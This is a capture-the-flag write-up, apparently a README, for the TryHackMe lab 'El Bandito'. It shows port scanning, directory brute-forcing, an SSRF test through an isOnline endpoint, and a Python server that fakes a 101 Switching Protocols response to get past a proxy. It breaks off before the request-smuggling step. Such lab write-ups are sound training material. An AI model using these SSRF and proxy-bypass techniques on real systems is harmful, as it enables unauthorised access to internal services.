# 🏴‍☠️ TryHackMe: El Bandito  
**Difficulty:** 🔴 Hard  

![Room Badge](https://tryhackme-badges.s3.amazonaws.com/manio11.png)

🔗 [View the room on TryHackMe](https://tryhackme.com/room/elbandito)

---

## 🧠 Summary
**El Bandito** is an advanced web exploitation challenge focused on chaining multiple vulnerabilities to bypass proxy restrictions and access internal endpoints.  
The exploitation path involves an **SSRF via WebSocket interaction**, followed by a **rare HTTP/2 → HTTP/1.1 downgrade desynchronization attack (H2.CL request smuggling)**.

**Key themes:**
- 📡 Reconnaissance & directory enumeration  
- 🧠 SSRF + WebSocket chaining  
- 🧱 Proxy bypass & internal endpoint discovery  
- 🔀 HTTP/2 → HTTP/1.1 downgrade exploit (request smuggling)  
- 🎯 Flag extraction through advanced desync techniques  

---

## 🧰 Tools & Techniques

| ⚙️ Tool / Technique | 📌 Purpose |
|---------------------|------------|
| **nmap** | Port scanning & service discovery |
| **Gobuster** | Directory and endpoint enumeration |
| **Burp Suite** | Proxy interception, header manipulation, HTTP/2 testing |
| **Python HTTP server** | Custom 101 Switching Protocols server for SSRF |
| **WebSocket analysis** | Understanding proxy behavior |
| **H2.CL exploitation techniques** | Testing downgrade-based request smuggling |

---

## 🚀 Attack Path

### 1. 🔎 Recon with nmap
```bash
nmap -sV -p- -T4 10.10.73.22
```

| Port     | Service | Notes               |
| -------- | ------- | ------------------- |
| 22/tcp   | SSH     | OpenSSH 8.2p1       |
| 80/tcp   | HTTPS   | “El Bandito Server” |
| 631/tcp  | IPP     | CUPS 2.4            |
| 8080/tcp | HTTP    | nginx API           |

---

### 2. 📜 Eerste verkenning van webroot

**Visit:** `https://10.10.73.22:80/`  
**Output:** `nothing to see here`

**Interesting asset:**
```html
<script src='/static/messages.js'></script>
```

Key findings in `messages.js`:
- Client-side chat system with two static users (Jack & Oliver)
- Weak rendering logic displaying whole objects instead of message text
- Bot triggers based on URL parameters
- Lack of proper error handling
- Possible vectors: client-side manipulation, WebSocket behavior abuse, SSRF triggers

---

### 3. 📂 Directory brute-forcing

```bash
gobuster dir -u https://10.10.73.22:80 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

| Path        | Status  | Notes           |
| ----------- | ------- | --------------- |
| `/access`   | 200     | Login area      |
| `/messages` | 302     | Related to chat |
| `/ping`     | 200     | Health check    |
| `/static/`  | 301/200 | Static assets   |

**Other findings:**

Most of the additional paths returned **405** or **403**, indicating that many admin or internal routes are restricted (potentially only accessible through internal references or via SSRF).

The directories `/static/` and `/access` appear to be useful entry points for further analysis, as they may contain JavaScript files, client-side logic, or hidden references.

---

### 4. 🔍 8080-port onderzoek

```bash
gobuster dir -u http://10.10.73.22:8080 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

| Path       | Status | Notes                 |
| ---------- | ------ | --------------------- |
| `/info`    | 200    | System information    |
| `/token`   | 200    | Token API             |
| `/admin`   | 403    | Admin-only            |
| `/env`     | 403    | Environment variables |
| `/metrics` | 403    | Monitoring endpoint   |

**Observations:**
- Many paths returned **403 Forbidden**, indicating that numerous admin/diagnostic endpoints are restricted from external requests.
- The presence of `/info` and `/token` returning status 200 is noteworthy — these may be low-barrier API or health endpoints that reveal useful information or behavior.
- The pattern (numerous JavaScript/API-related paths) suggests the presence of an internal service API or proxy layer — a strong candidate for SSRF or proxy-bypass testing.

---

### 5. 🧩 Identifying WebSocket + SSRF Behavior

Upon inspecting `http://10.10.73.22:8080/burn.html`, it was observed that the WebSocket was not functioning correctly. The webpage displayed a list of services:

- http://bandito.websocket.thm: OFFLINE
- http://bandito.public.thm: ONLINE

**Intercept (Burp Suite):**
```http
GET /isOnline?url=http://bandito.public.thm HTTP/1.1
Host: 10.10.73.22:8080
```
Test for SSRF behavior (simple listener):
```bash
# start a simple HTTP server on your attack box
python3 -m http.server 8000
```
Test request to the server (via Burp/proxy):
```http
GET /isOnline?url=http://<your-attackbox-ip>:8000 HTTP/1.1
Host: 10.10.73.22:8080
```

**Observation / conclusion:**
- The server made an outbound HTTP request to the supplied URL, and your simple HTTP server received the request → this confirms that the isOnline endpoint exhibits SSRF-like behavior (the server can reach external URLs).
- This opens the door for further exploitation: internal endpoints (403), admin routes, or health-check paths that are not directly accessible externally may be reachable through this SSRF vector.
- Since the UI includes WebSocket-related elements (though not functioning properly), it is reasonable to investigate whether the SSRF can be combined with a WebSocket upgrade or proxy misdirection to access internal admin endpoints.

---

### 6. 🧠 Exploiting SSRF via 101 Switching Protocols

To trick the proxy and simulate a WebSocket upgrade, I created a small custom Python HTTP server that returns a `101 Switching Protocols` response.

**Python script (`server.py`):**
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.protocol_version = "HTTP/1.1"
        self.send_response(101)
        self.end_headers()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 server.py <port>")
        sys.exit(1)
    HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
**Start the server:**
```bash
python3 server.py 9000
```

Trigger SSRF to your server (via the isOnline endpoint):
